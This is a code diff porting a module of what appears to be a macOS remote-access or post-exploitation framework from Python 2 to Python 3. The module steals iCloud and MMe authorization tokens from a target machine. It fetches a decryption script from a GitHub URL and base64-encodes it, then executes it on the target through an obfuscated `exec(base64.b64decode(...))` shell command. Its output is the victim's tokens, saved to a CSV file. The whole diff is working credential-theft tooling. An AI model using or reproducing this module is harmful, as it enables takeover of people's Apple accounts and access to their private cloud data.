@@ -1,10 +1,14 @@
-import urllib2
+from modules.helpers import ModuleABC
+import urllib.request
 import base64
 
 
-class Module:
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.code = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Retrieves iCloud and MMe authorization tokens.",
             "References": [
@@ -12,21 +16,20 @@ class Module:
             ],
             "Task": False
         }
-        self.code = None
 
-    def setup(self, module_view, output_view, successful):
-        module_view.add("This will prompt the user to allow keychain access.")
-        confirm = module_view.prompt("Are you sure you want to continue? [Y/n]: ").lower()
+    def setup(self, module_input, view, successful):
+        module_input.add("This will prompt the user to allow keychain access.", "attention")
+        confirm = module_input.prompt("Are you sure you want to continue? [Y/n]: ").lower()
 
         if not confirm or confirm == "y":
             request_url = "https://raw.githubusercontent.com/manwhoami/MMeTokenDecrypt/master/MMeDecrypt.py"
-            request = urllib2.Request(url=request_url)
-            response = "".join(urllib2.urlopen(request).readlines())
+            request = urllib.request.Request(url=request_url)
+            response = urllib.request.urlopen(request).read()
 
             self.code = base64.b64encode(response)
             successful.put(True)
         else:
-            output_view.add("Cancelled", "info")
+            view.output("Cancelled.", "info")
             successful.put(False)
 
     def run(self):
@@ -45,7 +48,7 @@ class Module:
                     print ": ".join(row)
         else:
             # Store the results in tokens.csv.
-            result = run_command("python -c 'import base64; exec(base64.b64decode(\\"%s\\"))'", False, False)
+            result = run_command("python -c 'import base64; exec(base64.b64decode(\\"{}\\"))'", False, False)
         
             with open(tokens_file, "wb") as csv_file:
                 writer = csv.writer(csv_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
@@ -63,5 +66,5 @@ class Module:
                     
                         print line
                         writer.writerow([line.split(": ")[0], line.split(": ")[1]])
-                print MESSAGE_INFO + "Tokens saved to \\"tokens.csv\\"."
-        """ % self.code
+                print MESSAGE_INFO + "Tokens saved to \\"%s\\"." % tokens_file
+        """.format(self.code.decode())
